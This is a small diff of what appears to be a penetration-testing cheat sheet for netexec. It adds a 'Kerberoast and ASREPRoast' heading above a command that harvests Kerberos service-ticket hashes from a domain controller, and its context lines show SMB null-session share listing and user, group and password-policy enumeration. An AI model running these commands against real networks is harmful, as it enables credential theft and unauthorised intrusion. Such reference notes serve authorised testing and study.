@@ -28,6 +28,11 @@ netexec smb target -u '' -p '' --shares
 # Enumerate Information
 netexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
 
+
+```
+
+## Kerberoast and ASREPRoast
+```bash
 # Kerberoast, target must be DC
 netexec ldap target -u username -p password --kerberoasting hash.txt  
 
